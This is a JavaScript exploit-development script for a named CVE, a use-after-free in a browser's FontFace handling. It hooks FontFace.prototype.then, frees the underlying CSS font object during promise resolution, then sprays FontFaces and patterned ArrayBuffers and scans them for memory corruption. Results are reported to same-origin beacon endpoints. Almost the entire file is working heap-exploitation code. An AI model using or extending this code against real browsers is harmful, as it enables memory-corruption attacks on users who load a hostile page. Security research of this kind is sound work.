// p458-fontface-uaf-eager.js — CVE-2026-43715 with EAGER promise creation
//
// V457 FINDING: DOMPromiseProxy defers JSPromise creation. When face.load()
// is called without prior access to the promise, resolve() just stores the value.
// The .then getter fires AFTER m_status is written → no UAF.
//
// FIX: Access face.loaded BEFORE face.load() → creates JSPromise in DOMPromiseProxy.
// Now when C++ resolve() is called during fontStateChanged, it finds the existing
// JSPromise → immediate JSPromise::resolve() → resolvePromise → .then getter fires
// SYNCHRONOUSLY during iterateClients → BEFORE m_status = newStatus write.
//
// Expected: getter fires with status "loading" (not "loaded"), confirming
// we're inside setStatus(Success) before the write.
(function() {
    var RUN = 'p458-' + Date.now().toString(36);
    function B(tag, body) {
        try {
            var x = new XMLHttpRequest();
            x.open('POST', '/beacon/' + tag + '/' + RUN, false);
            x.send(typeof body === 'object' ? JSON.stringify(body) : (body || ''));
        } catch(e) {}
    }

    B('BOOT', navigator.userAgent);

    // ═══════════════════════════════════════════════════════════════
    // TEST A: Timing verification — .loaded THEN .load()
    // Does the getter now fire with status "loading" instead of "loaded"?
    // ═══════════════════════════════════════════════════════════════
    try {
        var aLog = [];

        var styleA = document.createElement('style');
        styleA.textContent = "@font-face { font-family: 'p458a'; src: local('Arial'); }";
        document.head.appendChild(styleA);
        document.body.offsetHeight;

        var faceA = null;
        var it = document.fonts.values();
        var e;
        while (!(e = it.next()).done) {
            if (e.value.family.replace(/['"]/g, '') === 'p458a') { faceA = e.value; break; }
        }

        if (!faceA) { B('A-DEAD', 'NO-FACE'); }
        else {
            var thenA = 0;
            Object.defineProperty(FontFace.prototype, 'then', { get: function() {
                thenA++;
                aLog.push('THEN-' + thenA + '-status=' + faceA.status);
                return undefined;
            }, configurable: true });

            aLog.push('BEFORE-loaded-access');
            var promiseA = faceA.loaded; // ← EAGERLY CREATE JSPromise!
            aLog.push('AFTER-loaded-access-status=' + faceA.status);

            aLog.push('BEFORE-load');
            faceA.load(); // Now resolve() hits existing JSPromise → synchronous .then read
            aLog.push('AFTER-load-status=' + faceA.status);

            try { delete FontFace.prototype.then; } catch(e) {}

            B('A-RESULT', {log: aLog, thenCount: thenA, status: faceA.status});
        }
    } catch(e) { B('A-ERR', e.message.slice(0,200)); }


    // ═══════════════════════════════════════════════════════════════
    // TEST B: Eager promise + adopt in getter
    // If getter fires during iterateClients (before m_status write),
    // adopting frees the CSSFontFace → m_status = Success writes to freed memory
    // ═══════════════════════════════════════════════════════════════
    try {
        var bLog = [];

        var styleB = document.createElement('style');
        styleB.textContent = "@font-face { font-family: 'p458b'; src: local('Arial'); }";
        document.head.appendChild(styleB);
        document.body.offsetHeight;

        var ruleB = styleB.sheet.cssRules[0];
        var faceB = null;
        var itB = document.fonts.values();
        var eB;
        while (!(eB = itB.next()).done) {
            if (eB.value.family.replace(/['"]/g, '') === 'p458b') { faceB = eB.value; break; }
        }

        if (!faceB) { B('B-DEAD', 'NO-FACE'); }
        else {
            var thenB = 0;
            var sprayFaces = [];

            Object.defineProperty(FontFace.prototype, 'then', { get: function() {
                thenB++;
                bLog.push('THEN-' + thenB + '-status=' + faceB.status + '-BEFORE');

                if (thenB === 1) {
                    // Trigger adopt → free old CSSFontFace
                    ruleB.style.setProperty('font-weight', 'bold');
                    document.body.offsetHeight;

                    bLog.push('THEN-' + thenB + '-status=' + faceB.status + '-AFTER-ADOPT');

                    // Spray 3000 FontFaces to land on freed slot
                    for (var i = 0; i < 3000; i++) {
                        var ff = new FontFace('sb' + i, "local('ZZZZZ_NoFont_" + i + "')");
                        document.fonts.add(ff);
                        sprayFaces.push(ff);
                    }
                    bLog.push('SPRAYED-' + sprayFaces.length);
                }
                return undefined;
            }, configurable: true });

            bLog.push('BEFORE-loaded-access');
            var promiseB = faceB.loaded; // ← EAGERLY CREATE JSPromise!
            bLog.push('AFTER-loaded-access');

            bLog.push('BEFORE-load');
            faceB.load();
            bLog.push('AFTER-load-status=' + faceB.status);

            try { delete FontFace.prototype.then; } catch(e) {}

            B('B-RESULT', {log: bLog, thenCount: thenB, status: faceB.status});

            // Check spray faces for corruption
            var bLoaded = [], bLoading = [], bError = [];
            for (var i = 0; i < sprayFaces.length; i++) {
                var s = sprayFaces[i].status;
                if (s === 'loaded') bLoaded.push(i);
                else if (s === 'loading') bLoading.push(i);
                else if (s === 'error') bError.push(i);
            }
            B('B-CHECK', {
                total: sprayFaces.length,
                loaded: bLoaded.length,
                loading: bLoading.length,
                error: bError.length,
                loadedIdx: bLoaded.slice(0, 20),
                loadingIdx: bLoading.slice(0, 20)
            });
        }
    } catch(e) { B('B-ERR', e.message.slice(0,200)); }


    // ═══════════════════════════════════════════════════════════════
    // TEST C: Eager promise + adopt + AB spray with MC transfer flush
    // Full combo: eager promise, adopt in getter, transfer flush, AB spray
    // ═══════════════════════════════════════════════════════════════
    try {
        var cLog = [];

        // Pre-allocate filler ABs for dealloc log flush
        var fillerC = [];
        for (var i = 0; i < 1200; i++) {
            fillerC.push(new ArrayBuffer(320));
        }
        var mcC = new MessageChannel();

        var styleC = document.createElement('style');
        styleC.textContent = "@font-face { font-family: 'p458c'; src: local('Arial'); }";
        document.head.appendChild(styleC);
        document.body.offsetHeight;

        var ruleC = styleC.sheet.cssRules[0];
        var faceC = null;
        var itC = document.fonts.values();
        var eC;
        while (!(eC = itC.next()).done) {
            if (eC.value.family.replace(/['"]/g, '') === 'p458c') { faceC = eC.value; break; }
        }

        if (!faceC) { B('C-DEAD', 'NO-FACE'); }
        else {
            var thenC = 0;
            var sprayABs = [];

            Object.defineProperty(FontFace.prototype, 'then', { get: function() {
                thenC++;
                cLog.push('THEN-' + thenC + '-status=' + faceC.status);

                if (thenC === 1) {
                    ruleC.style.setProperty('font-weight', 'bold');
                    document.body.offsetHeight;
                    cLog.push('ADOPTED-status=' + faceC.status);

                    // Flush dealloc log via AB transfers
                    for (var i = 0; i < fillerC.length; i++) {
                        try { mcC.port1.postMessage(null, [fillerC[i]]); } catch(e) {}
                    }

                    // Spray ABs across size classes
                    for (var sz = 224; sz <= 512; sz += 32) {
                        for (var j = 0; j < 200; j++) {
                            var ab = new ArrayBuffer(sz);
                            var dv = new DataView(ab);
                            for (var off = 0; off < sz; off += 4) {
                                dv.setUint32(off, 0x50000000 + off, true);
                            }
                            sprayABs.push({ab: ab, sz: sz});
                        }
                    }
                    cLog.push('SPRAYED-AB-' + sprayABs.length);
                }
                return undefined;
            }, configurable: true });

            cLog.push('EAGER-LOADED');
            var promiseC = faceC.loaded; // ← EAGER!
            cLog.push('LOAD');
            faceC.load();
            cLog.push('DONE-status=' + faceC.status);

            try { delete FontFace.prototype.then; } catch(e) {}

            B('C-RESULT', {log: cLog, thenCount: thenC, status: faceC.status});

            // Scan for corruption
            var hits = [];
            for (var k = 0; k < sprayABs.length; k++) {
                var item = sprayABs[k];
                var dv = new DataView(item.ab);
                for (var off = 0; off < item.sz; off += 4) {
                    var expected = 0x50000000 + off;
                    var actual = dv.getUint32(off, true);
                    if (actual !== expected) {
                        hits.push({
                            idx: k, sz: item.sz, off: off,
                            exp: expected.toString(16),
                            got: actual.toString(16)
                        });
                        break;
                    }
                }
            }
            B('C-SPRAY', {total: sprayABs.length, hits: hits.length, details: hits.slice(0, 20)});
        }
    } catch(e) { B('C-ERR', e.message.slice(0,200)); }

    B('ALIVE', 'all-tests-completed');
    B('DONE', RUN);
})();
